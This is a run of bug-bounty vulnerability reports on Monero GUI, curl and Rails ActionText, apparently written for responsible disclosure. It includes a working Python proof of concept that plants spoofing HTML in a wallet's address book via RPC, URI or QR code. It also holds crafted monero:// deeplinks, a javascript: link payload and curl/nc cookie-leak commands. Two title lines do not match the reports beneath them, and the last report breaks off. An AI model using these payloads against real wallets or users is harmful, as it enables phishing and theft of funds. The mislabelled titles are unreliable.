title: monero:// deeplink parsing accepts tx_amount=(all) and can trigger send-all transaction mode
vulnerability_information:
## Summary

Monero GUI has two different URI ingestion paths.

QR/manual URI handling uses the canonical backend parser, but external `monero://` deeplinks are parsed by a separate QML routine in `main.qml`. That deeplink path forwards the raw `tx_amount` string into the transfer model without canonical numeric validation.

The transfer model reserves the literal string `"(all)"` as a privileged internal control value meaning "send all unlocked balance". Because the external deeplink path does not reject that sentinel, an attacker can supply a crafted URI such as:

`monero://<attacker_address>?tx_amount=(all)&tx_description=test`

and the wallet will enter the send-all transaction path for the attacker-controlled address.

## Releases Affected

Observed in the current Monero GUI source checkout corresponding to `0.18.4.6`.

Affected code paths:
- `main.qml:447-478`
- `pages/Transfer.qml:95-105`
- `pages/Transfer.qml:203-212`
- `main.qml:964-980`

Comparison path showing the stricter canonical parser:
- `src/libwalletqt/WalletManager.cpp:406-423`

## Steps To Reproduce

1. Inspect `main.qml:447-478`.
   `onUriHandler(uri)` manually parses `monero://` query parameters and forwards raw `params["tx_amount"]` into `middlePanel.transferView.sendTo(...)`.

2. Inspect `pages/Transfer.qml:95-105`.
   `fillPaymentDetails(...)` inserts the attacker-controlled amount into `recipientModel` via:
   `recipientModel.newRecipient(address, Utils.removeTrailingZeros(amount || ""))`
   There is no numeric validation here.

3. Inspect `pages/Transfer.qml:203-212`.
   `recipientModel.getAmountTotal()` treats the exact literal `"(all)"` as a special internal value and returns the wallet's unlocked balance.

4. Inspect `main.qml:964-980`.
   `handlePayment()` checks whether any recipient amount equals `"(all)"`. If so, it routes the request into:
   `currentWallet.createTransactionAllAsync(...)`
   instead of the normal numeric transaction creation path.

5. Compare this with `src/libwalletqt/WalletManager.cpp:406-423`.
   The canonical URI parser uses a typed `uint64_t amount` and converts it back to display text, which is materially stricter and does not expose the UI-only `"(all)"` sentinel as an external amount value.

6. Using those code paths, a deeplink like the following is sufficient to reach the send-all branch condition:
   `monero://<attacker_address>?tx_amount=(all)&tx_description=test`

## Observed Result

Attacker-controlled external deeplink input can reach the transaction flow as the reserved internal sentinel `"(all)"`, causing Monero GUI to prepare a send-all transfer to the attacker-controlled address.

## Expected Secure Behavior

External payment-request URIs should only accept canonical numeric amounts parsed by the backend URI parser. Reserved UI control values such as `"(all)"` should never be reachable from untrusted external input.

## Supporting Material / References

Relevant code references:
- `main.qml:447-478`
- `pages/Transfer.qml:95-105`
- `pages/Transfer.qml:203-212`
- `main.qml:964-980`
- `src/libwalletqt/WalletManager.cpp:406-423`

Validation scope:
- authorized local source review
- safe local reachability validation only
- no real wallets
- no real funds
- no public infrastructure

# AI Assistance Disclosure
AI was used to help organize and polish the report wording. The technical content is based on authorized local source review and safe local validation in my environment.

## Impact

A malicious payment link can be transformed from a normal payment request into a send-all request to an attacker-controlled address.

This is a transaction-integrity issue in a financial wallet. The victim still has to interact with the UI and confirm the transaction, so this is not zero-click theft, but the bug lets an attacker control whether the request is interpreted as a normal amount or as "send all unlocked balance." That materially increases the effectiveness of phishing and payment-request social engineering.

title: Windows installer grants low-privileged users write access to executable P2Pool directory, enabling local code execution
vulnerability_information:
## Summary

The Windows installer creates the P2Pool subdirectory inside the machine-wide install path with overly broad write permissions:

- `installers/windows/Monero.iss:59`
- `Name: "{app}\p2pool"; Permissions: users-full`

The GUI later trusts and executes `p2pool.exe` from that directory when the user starts P2Pool mining:

- `src/p2pool/P2PoolManager.cpp:124-129` (`isInstalled()` only checks file existence)
- `src/p2pool/P2PoolManager.cpp:154-210` (`start()` executes `p2pool.exe`)
- `src/p2pool/P2PoolManager.cpp:243-248` (Windows path is `{applicationDirPath()}/p2pool/p2pool.exe`)
- `pages/Mining.qml:295-318` and `pages/Mining.qml:654-656` (GUI path to starting P2Pool)

This creates a local binary planting issue: a low-privileged local user can replace or plant `p2pool.exe` in the writable P2Pool directory, and Monero GUI will later execute that attacker-controlled binary when a victim starts P2Pool from the GUI.

## Releases Affected

- Windows installer builds that include commit `432650008c4af92db138041d15b06e43fba0b7ab` dated **2022-05-28** (`Use "p2pool" folder for p2pool on Windows`)
- I have not yet confirmed the earliest tagged release containing this change
- I reviewed the local source tree on **2026-03-20**

## Why This Is Security-Relevant

The affected directory is part of a machine-wide installed application under `Program Files`, but the installer intentionally grants broad write access to ordinary users. That turns a trusted executable location into a user-writable code execution surface.

Because the GUI later launches `p2pool.exe` from that location, any low-privileged local attacker can cause attacker-controlled code to run in the context of whichever user later starts P2Pool from Monero GUI.

This is not a remote issue. It is a local privilege/trust-boundary issue.

## Steps To Reproduce

1. Install Monero GUI on Windows using the normal installer.
2. Confirm that the installer created a writable P2Pool directory:
   - Example target path: `%ProgramFiles%\Monero GUI Wallet\p2pool`
   - Collect ACLs with `icacls "%ProgramFiles%\Monero GUI Wallet\p2pool"`
3. From a low-privileged local user account, place a benign proof-of-concept executable at:
   - `%ProgramFiles%\Monero GUI Wallet\p2pool\p2pool.exe`
4. Use a harmless PoC executable that only creates a marker file such as:
   - `%TEMP%\monero_p2pool_poc.txt`
   - and writes a short message plus current username and timestamp
5. Launch Monero GUI as the victim user.
6. Go to the Mining screen and start P2Pool mining.
7. Observe that the planted `p2pool.exe` is executed instead of a trusted bundled binary.
8. Verify execution through:
   - the marker file
   - process creation logs
   - GUI behavior

## Expected Result

Low-privileged users should not be able to modify executables or executable search locations inside the machine-wide installed application directory.

## Actual Result

The installer grants broad write access to the executable P2Pool directory, and the GUI later executes `p2pool.exe` from that directory without any additional integrity check.

## Supporting Material / References

Code references:
- `installers/windows/Monero.iss:57-59`
- `src/p2pool/P2PoolManager.cpp:124-129`
- `src/p2pool/P2PoolManager.cpp:154-210`
- `src/p2pool/P2PoolManager.cpp:243-248`
- `pages/Mining.qml:295-318`
- `pages/Mining.qml:654-656`

Git history:
- Commit `432650008c4af92db138041d15b06e43fba0b7ab` dated **2022-05-28**
- Commit message: `Use "p2pool" folder for p2pool on Windows`

Planned attachments:
- `TODO: screenshot or text output of icacls on the p2pool directory`
- `TODO: SHA-256 of the benign planted p2pool.exe`
- `TODO: screenshot or recording of starting P2Pool from Monero GUI`
- `TODO: screenshot or contents of the marker file`
- `TODO: Sysmon / Procmon / Windows Event log process creation evidence showing execution of planted p2pool.exe`

## Novelty Check

I searched the public Monero GUI repository history, issue tracker, and public advisory surfaces for this behavior. I found the feature-introduction commit above, but I did not find a public security fix, advisory, or public duplicate specifically describing the installer-created writable executable P2Pool directory leading to local binary planting and execution.

## AI Assistance Disclosure

I used OpenAI Codex 5.4 with extra high reasoning to help review the local source code and draft this report. All findings, verification status, and final submission contents were reviewed by me before submission.

## Impact

A low-privileged local attacker can plant or replace `p2pool.exe` inside the writable P2Pool directory created by the Windows installer. When another user later starts P2Pool through Monero GUI, the attacker-controlled binary executes in that victim user's context.

This enables:

- cross-user local code execution
- persistence in a trusted application path
- compromise of the victim user's confidentiality, integrity, and availability
- possible privilege escalation if a higher-privileged user later runs Monero GUI and starts P2Pool

In practice, this means local malware or another unprivileged user on the same Windows system can turn Monero GUI's P2Pool feature into an execution trigger for arbitrary code.

title: HTML Injection in Transaction Confirmation Dialog via Address Book Description Enables UI Spoofing Before Fund Transfer
vulnerability_information:
## Summary The Monero GUI wallet renders address book descriptions as `TextEdit.RichText` (HTML) in the transaction confirmation dialog (`TxConfirmationDialog.qml:299`) without HTML entity escaping. An attacker can craft a `monero:` URI or QR code with HTML markup in the `tx_description` parameter. When a victim adds this address to their address book and later sends a transaction to it, the injected HTML renders in the confirmation dialog - the last UI defense before irreversible fund transfer. This enables UI spoofing where the attacker can display fake trust indicators (e.g., "+ VERIFIED EXCHANGE"), hide the real address with CSS, or inject misleading recipient labels to deceive the victim into confirming a transaction they would otherwise reject. ## Releases Affected * All versions through v0.18.4.6 (latest release) * All platforms (Linux, Windows, macOS) - the vulnerability is in platform-independent QML code * Both simple mode and advanced mode ## Steps To Reproduce # POC ```python #!/usr/bin/env python3 import argparse import subprocess import sys import os import urllib.parse import json # Attack payload - renders as green "VERIFIED EXCHANGE" badge in RichText HTML_PAYLOAD = '✓ VERIFIED EXCHANGE (Binance)
x' # Valid Monero stagenet address (replace with any valid address for testing) ATTACKER_ADDRESS = "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRJ5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge" def method_rpc(rpc_url): """Inject HTML directly into wallet address book via monero-wallet-rpc""" import requests print(f"[*] Connecting to wallet RPC: {rpc_url}") payload = { "jsonrpc": "2.0", "id": "0", "method": "add_address_book", "params": { "address": ATTACKER_ADDRESS, "description": HTML_PAYLOAD } } try: r = requests.post(rpc_url, json=payload, timeout=5) result = r.json() if "result" in result: idx = result["result"].get("index", "?") print(f"[+] INJECTED - address book entry #{idx} created") print(f"[+] Description contains: {HTML_PAYLOAD[:60]}...") print() print("[*] Now open Monero GUI wallet:") print(" 1. Go to Send page") print(" 2. Select the injected address from Address Book") print(" 3. Enter any amount and click Send") print(" 4. Observe the confirmation dialog - HTML renders as formatted text") print() print("[*] Expected: fake green '✓ VERIFIED EXCHANGE (Binance)' badge") print(" The real address label is hidden with tiny transparent text") else: print(f"[-] RPC error: {result}") except Exception as e: print(f"[-] Connection failed: {e}") print(" Start wallet RPC: monero-wallet-rpc --stagenet --wallet-file --rpc-bind-port 18083 --disable-rpc-login") def method_uri(): """Trigger injection via monero: URI handler - opens Monero GUI""" uri = f"monero:{ATTACKER_ADDRESS}?tx_description={urllib.parse.quote(HTML_PAYLOAD)}" print(f"[*] Malicious URI:") print(f" {uri}") print() print("[*] Opening via URI handler...") try: subprocess.Popen(["xdg-open", uri], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) print("[+] URI handler triggered - Monero GUI should open") print() print("[*] In the GUI:") print(" 1. Address Book page opens with pre-filled fields") print(" 2. tx_description contains HTML payload") print(" 3. Click Add to save") print(" 4. Send to this address → confirmation dialog shows injected HTML") except FileNotFoundError: print("[-] xdg-open not found") print(f" Manually paste this URI in Monero GUI Address Book:") print(f" {uri}") def method_qr(): """Generate QR code containing malicious monero: URI""" try: import qrcode except ImportError: print("[-] Install: pip install qrcode pillow --break-system-packages") sys.exit(1) uri = f"monero:{ATTACKER_ADDRESS}?tx_description={urllib.parse.quote(HTML_PAYLOAD)}" out = "/tmp/monero-gui-poc/malicious_qr.png" os.makedirs(os.path.dirname(out), exist_ok=True) qr = qrcode.make(uri) qr.save(out) print(f"[+] QR code saved: {out}") print(f"[*] URI encoded: {uri[:80]}...") print() print("[*] Attack scenario:") print(" 1. Attacker shares this QR code (forum, chat, printed)") print(" 2. Victim scans with Monero GUI (Address Book → QR scan)") print(" 3. AddressBook.qml:354 calls parse_uri_to_object()") print(" 4. HTML stored in address book without escaping") print(" 5. Next transaction to this address shows spoofed confirmation dialog") def main(): parser = argparse.ArgumentParser(description="Monero GUI HTML Injection PoC") parser.add_argument("--method", choices=["rpc", "uri", "qr"], required=True) parser.add_argument("--rpc-url", default="http://127.0.0.1:18083/json_rpc") args = parser.parse_args() print("=" * 60) print("PoC: Monero GUI TxConfirmationDialog HTML Injection") print("Vulnerability: TxConfirmationDialog.qml:299 RichText") print("=" * 60) print() if args.method == "rpc": method_rpc(args.rpc_url) elif args.method == "uri": method_uri() elif args.method == "qr": method_qr() if __name__ == "__main__": main() ``` ## Step 1: Craft a malicious monero: URI ``` monero:4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRJ5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge?tx_description=+ VERIFIED EXCHANGE
attacker controlled ``` This URI can also be encoded as a QR code for physical/social engineering attacks. ## Step 2: Victim adds address to address book 1. Victim opens Monero GUI → Address Book page 1. Victim pastes the `monero:` URI (or scans QR code via `AddressBook.qml:354-359`) 1. `AddressBook.qml:337` calls `walletManager.parse_uri_to_object(addressLine.text)` 1. `WalletManager.cpp:421` returns `tx_description` without HTML escaping 1. `AddressBook.qml:340` sets `descriptionLine.text = parsed.tx_description` 1. Victim clicks "Add" → `addressBook.addRow()` at line 455 stores the HTML in the wallet ### Step 3: Victim sends a transaction 1. Victim initiates a transaction to the saved address 1. Transaction confirmation dialog opens (`TxConfirmationDialog.qml`) 1. Line 305: `getDescription(recipient.address)` retrieves the unsanitized HTML description 1. Line 309: `title = FontAwesome.addressBook + " " + addressBookName` - no HTML escaping 1. Line 320: `return title + "
" + spacedaddress` - injected into HTML string 1. Line 299: `textFormat: TextEdit.RichText` - rendered as HTML 1. Victim sees fake trust indicators and confirms the transaction ## Data flow diagram ``` Attacker crafts malicious monero: URI / QR code │ ▼ Victim pastes URI in Address Book │ ├─ AddressBook.qml:337 → parse_uri_to_object() ├─ WalletManager.cpp:421 → tx_description returned raw (NO SANITIZATION) ├─ AddressBook.qml:340 → descriptionLine.text = parsed.tx_description └─ AddressBook.qml:455 → addRow() stores HTML in wallet address book │ ▼ (later, when sending) TxConfirmationDialog opens │ ├─ Line 305 → getDescription(recipient.address) retrieves stored HTML ├─ Line 309 → concatenated without escaping ├─ Line 320 → injected into HTML: title + "
" + spacedaddress └─ Line 299 → textFormat: TextEdit.RichText renders as HTML │ ▼ UI SPOOFING - victim sees manipulated confirmation dialog ``` # Vulnerable code ```qml // TxConfirmationDialog.qml:297-300 TextEdit { id: recipientValue textFormat: TextEdit.RichText // <-- LINE 299: renders HTML readOnly: true // TxConfirmationDialog.qml:305-320 function getRecipientContent(recipient) { var addressBookName = currentWallet.addressBook.getDescription(recipient.address) // line 305 var title = "" if (addressBookName) { title = FontAwesome.addressBook + " " + addressBookName // line 309: NO ESCAPING } // ... return title + "
" + spacedaddress // line 320: injected into HTML } ``` ## Source - no sanitization in parser ```cpp // WalletManager.cpp:406-421 bool WalletManager::parse_uri_to_object(const QString &uri, ...) { // ... *tx_description = QString::fromStdString(o.tx_description); // line 421: RAW return true; } ``` ## Supporting Material/References * Same attack vector (malicious `monero:` URI) was used in CVE-2021-3401 (`platformpluginpath` injection, patched at `main.cpp:214`), but that targeted a different sink. This report targets the TxConfirmationDialog RichText rendering - a separate vulnerability. * The QR code scan path (`AddressBook.qml:354-359`) provides an additional attack vector beyond URI pasting. * `NetworkAccessBlockingFactory` at `main.cpp:449-451` blocks outbound network requests from QML on Qt >= 5.12, preventing `` exfiltration. However, this does NOT prevent UI spoofing via HTML/CSS formatting, which is the primary impact of this finding. * Additional sinks with the same root cause (unsanitized data in RichText) exist at: - `pages/settings/SettingsLog.qml:198` - daemon console output - `components/LineEditMulti.qml:115` - text label - `components/LineEdit.qml:177` - text label ### Suggested fix HTML-escape all dynamic content before inserting into RichText: ```javascript // Add helper function function escapeHtml(text) { return text.replace(/&/g, '&') .replace(//g, '>') .replace(/"/g, '"') .replace(/'/g, '''); } // TxConfirmationDialog.qml line 309 - fix: if (addressBookName) { title = FontAwesome.addressBook + " " + escapeHtml(addressBookName); } ``` Additionally, sanitize `tx_description` in `WalletManager.cpp:421` before returning to QML: ```cpp *tx_description = QString::fromStdString(o.tx_description) .toHtmlEscaped(); // Qt built-in HTML escaping ``` ## Housekeeping 1. Policy reviewed and followed - no live network interaction, code review and local testing only 2. XMR Address: [INSERT YOUR XMR ADDRESS HERE] 3. PoC URI and attack flow verified against source code at HEAD of master branch ## AI Disclosure This vulnerability was identified with assistance from AI tools (Claude Code). The code analysis, data flow tracing from URI parsing through address book storage to RichText rendering, and fix recommendations were conducted by the researcher with AI assistance. All findings were manually verified against the monero-gui source code. ## Impact The transaction confirmation dialog is the last UI defense before irreversible cryptocurrency transfer. HTML injection here enables: 1. **Address label spoofing** - display "✓ Binance Hot Wallet" or "Kraken Deposit" next to the attacker's address, making the victim believe they are sending to a trusted exchange 2. **Visual deception** - use CSS (`font-size:1px; color:transparent`) to hide the real address while showing a fake trusted address in large visible text 3. **Trust indicator injection** - add green checkmarks, "VERIFIED" badges, or fake security labels that do not exist in the legitimate UI 4. **Information hiding** - use `display:none` or matching background colors to obscure portions of the legitimate dialog content A successful attack results in the victim voluntarily confirming a transaction to the attacker's address, believing it to be a trusted recipient. Since Monero transactions are irreversible and pseudonymous, the funds are permanently lost with no recourse. The attack scales through QR codes distributed on social media, forums, or printed materials - anywhere a Monero address might be shared.

title: View-only offline transaction creation bypasses the long-payment-ID privacy block
Background sync cache retains outgoing additional transaction secret keys
vulnerability_information:
## Summary:
Monero wallet background sync is documented as scanning "with just the view key while the wallet is locked." The source also documents `wallet2::clear_user_data()` as the scrub step intended to remove data not needed by a background wallet with only a hot view key.

In the reviewed source tree, `wallet2::store_background_cache()` clones the full wallet cache, calls `clear_user_data()`, and stores the result as the background cache. `clear_user_data()` clears `m_tx_keys`, but it does not clear `m_additional_tx_keys`, even though `m_additional_tx_keys` is a serialized wallet-cache field containing `std::vector<crypto::secret_key>` values indexed by transaction hash.

This appears to leave outgoing additional transaction secret keys in the lower-trust background cache encrypted under the background cache key rather than only under the main wallet cache protection.

This is not a spend-key or seed disclosure issue. The theoretical impact is limited to wallet privacy / proof-key material exposure for outgoing transactions that used additional tx keys.

## Releases Affected:

  * Reviewed local source tree: `src/version.cpp.in` declares `DEF_MONERO_VERSION "0.18.1.0"`.
  * Affected OS: likely OS-independent wallet cache logic on Linux, macOS, Windows, and other supported platforms if this code is present.
  * Exact maintained release range was not validated and should be confirmed by maintainers against current supported branches.

## Steps To Reproduce:
No exploit, payload, crash trigger, or live-network validation was performed. These are source-code review steps only.

  1. Review `wallet2::store_background_cache()`: it serializes the current wallet object, deserializes it into a background wallet object, calls `background_w2->clear_user_data()`, then stores the background cache.
  1. Review `wallet2::clear_user_data()`: it clears `m_tx_keys`, notes, destinations, labels, attributes, and related user data, but does not clear `m_additional_tx_keys`.
  1. Review wallet serialization: `m_additional_tx_keys` is serialized in the wallet cache.
  1. Review the field definition: `m_additional_tx_keys` stores `std::vector<crypto::secret_key>` values.
  1. Review transaction commit/signing paths: outgoing transaction information stores `ptx.additional_tx_keys` into `m_additional_tx_keys` when `store_tx_info()` is enabled, which is the default.
  1. Review proof/check logic: additional tx keys are later used as secret inputs for tx-key checks and tx proofs, showing they are sensitive transaction secret material.

## Supporting Material/References:

  * `src/wallet/wallet2.cpp:13751` - `wallet2::store_background_cache()` clones, scrubs, and stores the background cache.
  * `src/wallet/wallet2.cpp:4532` - `wallet2::clear_user_data()` clears `m_tx_keys` but not `m_additional_tx_keys`.
  * `src/wallet/wallet2.h:1819` - comment explains `clear_user_data()` exists for background wallet sensitive-data minimization.
  * `src/wallet/wallet2.h:1390` - `m_additional_tx_keys` is serialized into the wallet cache.
  * `src/wallet/wallet2.h:1934` - `m_additional_tx_keys` stores `std::vector<crypto::secret_key>`.
  * `src/wallet/wallet2.cpp:7627` - commit path stores `ptx.additional_tx_keys`.
  * `src/wallet/wallet2.cpp:1200` - `m_store_tx_info` defaults to true.
  * `src/wallet/wallet2.cpp:12088` - additional tx keys are used in tx-key checks.
  * `src/wallet/wallet2.cpp:12252` - additional tx keys are used to generate tx proofs.

## Why this may be reportable:
The code has an explicit scrub function for background sync data minimization. That scrub clears the primary outgoing transaction secret-key map, `m_tx_keys`, but misses the adjacent serialized secret-key map, `m_additional_tx_keys`.

Because background sync can use a custom background password and is described as view-key-only scanning while locked, retaining extra outgoing transaction secret keys in the background cache appears to cross the intended wallet-lock/background-sync trust boundary.

## Why this may be a false positive:
Maintainers may consider the background cache password/key sufficient protection for all cached metadata, or may classify additional tx keys as acceptable to retain in the background cache. Also, practical impact requires local access to the background cache and relevant background credentials, and only affects transactions with non-empty additional tx keys.

## Suggested remediation:
Clear `m_additional_tx_keys` in `wallet2::clear_user_data()` alongside `m_tx_keys`.

Consider adding a regression test or static serialization assertion that a background cache produced from a wallet containing both `m_tx_keys` and `m_additional_tx_keys` retains neither field.

## AI Usage Acknowledgement:
This report was prepared with AI assistance for source-code navigation, candidate triage, and drafting. The substantive claim is based on the cited Monero source files. No PoC, exploit code, payload, fuzzing, crash triggering, live-network testing, or reproduction script was created.

## Housekeeping

1. I have reviewed the program policy before submitting.
2. XMR address: 479Zu6GkFNTfRcNkesCtHNJg37KE72PAG5VLFC1bQNBjLEi2ZqhUByff67M1KsHVpsEs5CBP6YgNwgrJTZRPmbRZUSVvtM6

## Impact

A local actor who can access the background wallet cache and its background password/key, but not the main wallet password, may be able to recover outgoing additional transaction secret keys retained in `m_additional_tx_keys`.

The likely impact is transaction privacy degradation and unintended disclosure of proof-capable outgoing transaction key material for affected transactions. This could help prove or link wallet involvement in specific outgoing payments under some conditions, especially when combined with transaction IDs, recipient addresses, or other wallet/cache metadata.

This does not appear to expose the wallet seed, private spend key, or private view key, and it does not appear to allow spending funds.

title: Monero GUI OpenAlias DNSSEC-invalid resolution still writes spoofable address into recipient field
Domainless COOKIEFILE cookie leaks to unrelated IP-literal hosts
vulnerability_information:
When curl loads a cookie file written as raw HTTP `Set-Cookie:` header lines and a line has no `Domain` attribute, the cookie is stored with `co->domain == NULL`, because a file import has no request-host to scope it to. On the send side, `Curl_cookie_getlist` accepts any cookie in the bucket whose domain is NULL before it ever compares the request host (the `!co->domain ||` short-circuit at `lib/cookie.c:1340`) and `cookiehash()` places both NULL-domain cookies and numeric-IP hosts in the same bucket 0 (`lib/cookie.c:216`). The result is that a domainless cookie from a file gets attached to requests for unrelated IP-literal hosts. An attacker who can steer the client into following a redirect to an IP literal can harvest whatever credential that cookie carries.

## Steps to reproduce (tested with curl 8.7.1 on macOS)

**Start a listener on port 8888.** 
```
printf 'HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n' | nc -l 8888
```
(On Linux / GNU netcat, the port is passed as `nc -l -p 8888` instead.)

**Step 1:** write a cookie file in HTTP `Set-Cookie:` header format, with **no** `Domain` attribute:

```
printf 'Set-Cookie: SBF_SECRET=secret; Path=/\r\n' > c.txt
```

**Step 2:** load that file and make a request to an IP-literal host:

```
curl -v -b c.txt http://127.0.0.1:8888/
```

curl's verbose output shows `> Cookie: SBF_SECRET=secret`. The domainless cookie was sent to `127.0.0.1`, even though the `CURLOPT_COOKIEFILE.md` docs say it must not be.

**Negative control (optional):** repeat step 2 against a DNS name that resolves to the same IP, and the cookie is *not* sent, which isolates the leak to the IP-literal path:

```
curl -v -b c.txt --resolve example.test:8888:127.0.0.1 http://example.test:8888/
```

## Impact

This is a cross-origin leak of a host-scoped credential. Cookies loaded via COOKIEFILE frequently carry session IDs, API tokens, or other secrets. This bug attaches such a cookie to a request for an unrelated host, contradicting curl's documented COOKIEFILE behavior and RFC 6265 §5.3/§5.4 cookie scoping.

The victim runs curl with such a cookie jar and `-L`, and an endpoint the attacker controls or influences (an open redirect on a trusted site, or any followed hop) points curl at `http://<attacker-ip>/`. The domainless cookie is then sent to that attacker-controlled IP in a plaintext `Cookie:` header and the attacker can replays whatever it protects (session ID, API token, CSRF secret) to act as the victim.

title: URI scheme validation bypass in ActionText `to_markdown` via user-supplied `<action-text-markdown>` marker tag
vulnerability_information:
The markdown converter treats every `<action-text-markdown>` element as trusted internally-generated markup and emits its text verbatim. `Content#to_markdown` only creates that tag when serializing attachments, but the visitor does not distinguish internal nodes from user-supplied ones. A rich-text body containing a literal `<action-text-markdown>` tag therefore bypasses the URI-scheme validation that was added for normal links.

## the bad lines

`actiontext/lib/action_text/markdown_conversion.rb:80`

```ruby
SKIP_ESCAPING_PARENTS = %w[ action-text-markdown code pre ].freeze
```

`actiontext/lib/action_text/markdown_conversion.rb:96-97`

```ruby
elsif skip_markdown_escaping?(node)
  node.content
```

`actiontext/lib/action_text/markdown_conversion.rb:226-228`

```ruby
def visit_action_text_markdown(_node, child_values)
  join_children(child_values)
end
```

`pre` and `code` are in the same skip list but their visitors wrap output in fenced code, so a link payload inside them becomes inert code. `visit_action_text_markdown` emits raw, which is why this specific marker is the bypass.

## proof of concept

Save as `actiontext/test/unit/markdown_passthrough_bypass_test.rb`:

```ruby
require "test_helper"

class ActionTextMarkdownPassthroughBypassTest < ActiveSupport::TestCase
  test "user-supplied <action-text-markdown> emits markdown link bypassing URI scheme validation" do
    payload = "<action-text-markdown>[click](javascript:alert(1))</action-text-markdown>"
    markdown = ActionText::Content.new(payload).to_markdown

    refute_match(/\(javascript:/, markdown,
      "expected URI scheme validation to reject javascript: URI, got: #{markdown.inspect}")
  end
end
```

Run from the repo root:

```
cd actiontext && bin/test test/unit/markdown_passthrough_bypass_test.rb
```

Observed:

```
Failure:
expected URI scheme validation to reject javascript: URI, got: "[click](javascript:alert(1))"
```

Control: the existing remote-image hardening tests still pass:

```
cd actiontext && bin/test test/unit/markdown_conversion_test.rb -n '/RemoteImage attachment with disallowed URI scheme|RichText#to_markdown/'
# 5 runs, 5 assertions, 0 failures, 0 errors
```


## suggested fix

Strip user-supplied `<action-text-markdown>` nodes before `to_markdown` creates its own internal markers. Drop-in diff:

```diff
--- a/actiontext/lib/action_text/content.rb
+++ b/actiontext/lib/action_text/content.rb
@@ -146,6 +146,11 @@ module ActionText
       end

       def to_markdown(attachment_links: false)
+        # Prevent user-supplied <action-text-markdown> nodes from being treated
+        # as trusted internal markdown passthrough by the markdown converter.
+        fragment.find_all("action-text-markdown").each do |node|
+          node.replace(node.children)
+        end
         render_attachments(with_full_attributes: false) { |attachment|
           ActionText::HtmlConversion.create_element("action-text-markdown").tap do |node|
             node.content = attachment.to_markdown(attachment_links: attachment_links)
```

`fragment.find_all` is the same Nokogiri idiom already used at `content.rb:56` and `:210`. After this change the PoC test passes and the existing attachment-markdown tests are unaffected.

## Impact

Any consumer of ActionText::RichText#to_markdown / Content#to_markdown output (preview pane, email digest, federated mirror, secondary markdown renderer) can receive an attacker-controlled
  javascript:, data:, or other unsafe-scheme markdown link from a user who can author rich text. The URI safety boundary added by PRs #56871 and #56909 to normal <a> and remote-image attachment paths is
   undone for markdown export when the user wraps the payload in <action-text-markdown>.
  
  The HTML rendering path (Content#to_s) is not directly affected; the marker tag is stripped and the payload renders as inert text. The bypass is specific to markdown export.

title: wolfSSL backend disables hostname verification when CURLOPT_SSL_VERIFYPEER is 0

weakness.name: Improper Validation of Certificate with Host Mismatch

vulnerability_information:
## Summary

When curl is built against wolfSSL, setting CURLOPT_SSL_VERIFYPEER=0 causes a hostname-mismatched certificate to be accepted even though CURLOPT_SSL_VERIFYHOST remains at its default enabled setting. I built wolfSSL from source, built curl against it, and connected to a TLS server presenting a certificate for an unrelated hostname (CN=totally-wrong-hostname.invalid) while requesting https://localhost/; the handshake completed and the HTTP request/response exchanged normally. This reproduced identically on released curl 8.21.0 and current HEAD (5c61e16869 / 8.22.0-DEV). A control run of the identical reproducer against curl's OpenSSL backend correctly rejected the same certificate ("certificate subject name ... does not match target hostname"), confirming this is specific to the wolfSSL backend rather than a general curl behavior. A second control -- the wolfSSL backend with fully default options (CURLOPT_SSL_VERIFYPEER left at its default of 1) -- correctly rejected the same server, isolating the bug precisely to the VERIFYPEER=0 condition.

## Affected Version

- curl/libcurl 8.21.0 (release tag curl-8_21_0), built with -DCURL_USE_WOLFSSL=ON against wolfSSL built from upstream source
- Also reproduced on current HEAD, commit 5c61e16869 (8.22.0-DEV), identical build configuration
- wolfSSL version used: built from wolfSSL upstream master (~5.9.2) via ./configure --enable-opensslextra --enable-curl --enable-static --enable-shared && make && make install
- curl -V output from the HEAD build used: curl 8.22.0-DEV (Linux) libcurl/8.22.0-DEV wolfSSL/5.9.2 zlib/1.3.1
- Affected: curl/libcurl when built with the wolfSSL TLS backend. Not claiming this affects any other TLS backend; OpenSSL was tested directly as a control and does not exhibit this behavior (see below).

## Steps to Reproduce

1. Build wolfSSL from source with --enable-opensslextra --enable-curl.
2. Build curl (release tag curl-8_21_0, or HEAD) with -DCURL_USE_WOLFSSL=ON against that wolfSSL build.
3. Generate a self-signed certificate for a hostname that does not match the target, e.g. CN=totally-wrong-hostname.invalid.
4. Start a minimal TLS server (Python ssl module is sufficient) on localhost using that certificate.
5. Using a minimal libcurl client, set CURLOPT_URL to https://localhost:<port>/, set CURLOPT_SSL_VERIFYPEER to 0, and leave CURLOPT_SSL_VERIFYHOST unset (default enabled).
6. Call curl_easy_perform().
7. Observe the TLS handshake completes and the HTTP request/response exchange succeeds despite the hostname mismatch.
8. Control 1: repeat the identical reproducer linked against curl's OpenSSL backend instead. Observe it correctly rejects the connection.
9. Control 2: repeat the identical reproducer against the wolfSSL backend with fully default options (do not set CURLOPT_SSL_VERIFYPEER at all). Observe it correctly rejects the connection, isolating the bug to the VERIFYPEER=0 condition specifically.

This was implemented as a minimal libcurl C reproducer (tls_repro.c) driving a minimal Python TLS test server (https_server.py) that serves the mismatched-hostname certificate and logs whether the handshake completed. Both are attached to this report as the PoC.

## Vulnerable Source

lib/vtls/wolfssl.c:
- wssl_ctx_init() / connection setup: sets wolfSSL_CTX_set_verify(wctx->ssl_ctx, conn_config->verifypeer ? WOLFSSL_VERIFY_PEER : WOLFSSL_VERIFY_NONE, NULL) -- so the whole wolfSSL-internal verification pipeline runs in non-failing (WOLFSSL_VERIFY_NONE) mode whenever verifypeer is off.
- wssl_connect_step1(): registers an SNI-based hostname check via wolfSSL_check_domain_name(wssl->ssl, connssl->peer.sni), gated only on conn_config->verifyhost (correctly independent of verifypeer at the point of registration).
- wssl_connect_step2(): after wolfSSL_connect(), there is an explicit, independent post-handshake re-check for the case where the target is a raw IP address (no SNI) -- but no equivalent independent re-check exists for the SNI/named-host case. The code goes straight to if(ret == WOLFSSL_SUCCESS) return CURLE_OK;. Under WOLFSSL_VERIFY_NONE, wolfSSL_connect() returns success regardless of whether the registered domain check matched, and for the SNI path there is nothing left afterward to catch that.

Net effect: the hostname check is registered independently of verifypeer, but its enforcement is not -- it is silently absorbed by the same "do not fail on verification problems" mode that verifypeer=0 turns on.

## Weakness

